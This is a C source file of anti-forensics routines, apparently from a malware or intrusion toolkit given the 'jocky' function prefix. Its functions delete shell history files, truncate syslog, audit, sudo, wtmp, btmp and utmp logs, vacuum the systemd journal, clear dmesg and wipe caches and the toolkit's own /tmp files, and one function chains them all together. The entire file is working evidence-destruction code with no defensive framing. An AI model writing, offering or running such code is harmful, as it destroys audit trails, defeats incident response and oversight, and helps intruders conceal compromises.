#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <pwd.h>

int jocky_linux_wipe_bash_history(void) {
    char history_path[512];
    struct passwd *pw = getpwuid(getuid());
    if (!pw) return -1;
    snprintf(history_path, sizeof(history_path), "%s/.bash_history", pw->pw_dir);
    return (unlink(history_path) == 0 || access(history_path, F_OK) != 0) ? 0 : -1;
}

int jocky_linux_wipe_zsh_history(void) {
    char history_path[512];
    struct passwd *pw = getpwuid(getuid());
    if (!pw) return -1;
    snprintf(history_path, sizeof(history_path), "%s/.zsh_history", pw->pw_dir);
    return (unlink(history_path) == 0 || access(history_path, F_OK) != 0) ? 0 : -1;
}

int jocky_linux_wipe_shell_history(void) {
    jocky_linux_wipe_bash_history();
    jocky_linux_wipe_zsh_history();
    return 0;
}

int jocky_linux_clear_syslog(void) {
    return system("truncate -s 0 /var/log/syslog 2>/dev/null; truncate -s 0 /var/log/messages 2>/dev/null") >= 0 ? 0 : -1;
}

int jocky_linux_clear_audit_log(void) {
    return system("truncate -s 0 /var/log/audit/audit.log 2>/dev/null") >= 0 ? 0 : -1;
}

int jocky_linux_clear_journal(void) {
    return system("journalctl --vacuum-time=1s 2>/dev/null") >= 0 ? 0 : -1;
}

int jocky_linux_clear_dmesg(void) {
    return system("dmesg -c >/dev/null 2>&1") >= 0 ? 0 : -1;
}

int jocky_linux_wipe_tmp(void) {
    return system("rm -rf /tmp/.jocky* /tmp/jocky* 2>/dev/null") >= 0 ? 0 : -1;
}

int jocky_linux_wipe_home_cache(void) {
    return system("rm -rf ~/.cache ~/.local/share/recently-used* 2>/dev/null") >= 0 ? 0 : -1;
}

int jocky_linux_clear_command_history(void) {
    return system("history -c; history -w") >= 0 ? 0 : -1;
}

int jocky_linux_wipe_sudo_logs(void) {
    return system("truncate -s 0 /var/log/sudo 2>/dev/null") >= 0 ? 0 : -1;
}

int jocky_linux_wipe_wtmp_utmp(void) {
    return system("truncate -s 0 /var/log/wtmp /var/log/btmp /var/run/utmp 2>/dev/null") >= 0 ? 0 : -1;
}

int jocky_linux_cleanup_all_forensics(void) {
    jocky_linux_wipe_shell_history();
    jocky_linux_clear_syslog();
    jocky_linux_clear_audit_log();
    jocky_linux_clear_journal();
    jocky_linux_clear_dmesg();
    jocky_linux_wipe_tmp();
    jocky_linux_wipe_home_cache();
    jocky_linux_wipe_sudo_logs();
    jocky_linux_wipe_wtmp_utmp();
    return 0;
}
